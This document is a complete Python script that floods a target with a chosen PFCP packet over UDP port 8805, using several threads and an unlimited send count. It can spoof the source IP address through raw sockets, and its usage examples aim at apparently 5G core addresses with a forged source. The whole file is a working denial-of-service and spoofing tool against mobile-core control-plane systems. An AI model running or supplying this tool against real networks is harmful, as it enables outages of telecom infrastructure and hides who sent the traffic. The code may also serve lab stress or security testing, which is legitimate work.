#!/usr/bin/env python3
"""
PFCP Flood — loop-send a raw hex PFCP packet over UDP.

Supports source IP spoofing via raw sockets (requires root).

Usage:
    python3 pfcp_flood.py <HEX_PACKET> [TARGET] [OPTIONS]

Examples:
    python3 pfcp_flood.py 20010008000001... 127.0.0.1
    python3 pfcp_flood.py 20010008000001... 10.0.0.1 -s 10.0.0.2 -c 100000
    python3 flood_heartbeat.py 2001000c0008fc0000600004edd50884 172.22.0.8 -s 172.22.0.38 -c 10000000
"""

import argparse
import socket
import struct
import threading
import time

PFCP_PORT = 8805

_stop = threading.Event()
_lock = threading.Lock()
_sent = 0


def _ip_checksum(header: bytes) -> int:
    """Compute IP header checksum."""
    if len(header) % 2:
        header += b'\x00'
    s = 0
    for i in range(0, len(header), 2):
        s += (header[i] << 8) + header[i + 1]
    while s >> 16:
        s = (s & 0xFFFF) + (s >> 16)
    return ~s & 0xFFFF


def _build_raw_packet(src_ip: str, dst_ip: str, src_port: int, dst_port: int, payload: bytes) -> bytes:
    """Build IP + UDP + payload for raw socket (IP_HDRINCL)."""
    # IP header (20 bytes)
    ihl_ver = (4 << 4) | 5          # IPv4, IHL=5
    tos = 0
    total_len = 20 + 8 + len(payload)
    ident = 0
    frag_off = 0
    ttl = 64
    proto = 17                       # UDP
    checksum = 0                     # computed below
    src = socket.inet_aton(src_ip)
    dst = socket.inet_aton(dst_ip)

    ip_hdr = struct.pack("!BBHHHBBH4s4s",
                         ihl_ver, tos, total_len, ident, frag_off,
                         ttl, proto, checksum, src, dst)
    checksum = _ip_checksum(ip_hdr)
    ip_hdr = struct.pack("!BBHHHBBH4s4s",
                         ihl_ver, tos, total_len, ident, frag_off,
                         ttl, proto, checksum, src, dst)

    # UDP header (8 bytes, checksum = 0 → kernel fills)
    udp_len = 8 + len(payload)
    udp_hdr = struct.pack("!HHHH", src_port, dst_port, udp_len, 0)

    return ip_hdr + udp_hdr + payload


def _send_udp(sock: socket.socket, target: tuple, pkt: bytes, count: int):
    """Send via standard UDP socket."""
    global _sent
    n = 0
    try:
        while not _stop.is_set():
            if count and n >= count:
                break
            try:
                sock.sendto(pkt, target)
                n += 1
            except OSError:
                time.sleep(0.001)
    finally:
        with _lock:
            _sent += n


def _send_raw(sock: socket.socket, dst: tuple, raw_pkt: bytes, count: int):
    """Send via raw socket (IP_HDRINCL)."""
    global _sent
    n = 0
    try:
        while not _stop.is_set():
            if count and n >= count:
                break
            try:
                sock.sendto(raw_pkt, dst)
                n += 1
            except OSError:
                time.sleep(0.001)
    finally:
        with _lock:
            _sent += n


def main():
    parser = argparse.ArgumentParser(description="Loop-send a hex PFCP packet over UDP")
    parser.add_argument("hex", help="Raw PFCP packet as hex string")
    parser.add_argument("host", nargs="?", default="127.0.0.1", help="Target host")
    parser.add_argument("-p", "--port", type=int, default=PFCP_PORT, help="Target port")
    parser.add_argument("-s", "--src-ip", default=None, help="Source IP (requires root)")
    parser.add_argument("-q", "--src-port", type=int, default=PFCP_PORT, help="Source port (with --src-ip)")
    parser.add_argument("-c", "--count", type=int, default=0, help="0 = unlimited")
    parser.add_argument("-t", "--threads", type=int, default=4)
    args = parser.parse_args()

    payload = bytes.fromhex(args.hex.replace(" ", "").replace("0x", ""))
    dst_ip = args.host
    dst_port = args.port
    per_thread = args.count // args.threads if args.count else 0

    print(f"Target : {dst_ip}:{dst_port}")
    print(f"Source : {args.src_ip or '(real)'}:{args.src_port if args.src_ip else '(real)'}")
    print(f"Packet : {len(payload)} bytes | {payload.hex()}")
    print(f"Threads: {args.threads} | Count: {args.count or 'unlimited'}")
    print(f"Ctrl+C to stop\n")

    t0 = time.time()
    socks = []
    threads = []

    if args.src_ip:
        # Raw socket mode — IP_HDRINCL
        dst_ip_resolved = socket.gethostbyname(dst_ip)
        raw_pkt = _build_raw_packet(args.src_ip, dst_ip_resolved, args.src_port, dst_port, payload)
        src_in_hdr = socket.inet_ntoa(raw_pkt[12:16])
        dst_in_hdr = socket.inet_ntoa(raw_pkt[16:20])
        sp_in_hdr = struct.unpack("!H", raw_pkt[20:22])[0]
        dp_in_hdr = struct.unpack("!H", raw_pkt[22:24])[0]
        print(f"Raw pkt: {len(raw_pkt)} bytes (IP+UDP+payload)")
        print(f"IP hdr : {src_in_hdr} → {dst_in_hdr}  |  UDP: {sp_in_hdr} → {dp_in_hdr}")
        print(f"Hex    : {raw_pkt.hex()}\n")
        for _ in range(args.threads):
            s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_UDP)
            s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
            s.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 4 * 1024 * 1024)
            socks.append(s)
            t = threading.Thread(target=_send_raw, args=(s, (dst_ip_resolved, 0), raw_pkt, per_thread), daemon=True)
            t.start()
            threads.append(t)
    else:
        # Standard UDP mode
        for _ in range(args.threads):
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 4 * 1024 * 1024)
            socks.append(s)
            t = threading.Thread(target=_send_udp, args=(s, (dst_ip, dst_port), payload, per_thread), daemon=True)
            t.start()
            threads.append(t)

    try:
        for t in threads:
            t.join()
    except KeyboardInterrupt:
        print("\nStopping...")
        _stop.set()
        for t in threads:
            t.join(timeout=3)
    finally:
        for s in socks:
            s.close()

    elapsed = time.time() - t0
    pps = _sent / elapsed if elapsed else 0
    bw = _sent * len(payload) * 8 / 1e6 / elapsed if elapsed else 0
    print(f"\nSent {_sent:,} pkts in {elapsed:.2f}s  ({pps:,.0f} pkt/s, {bw:.2f} Mbps)")


if __name__ == "__main__":
    main()
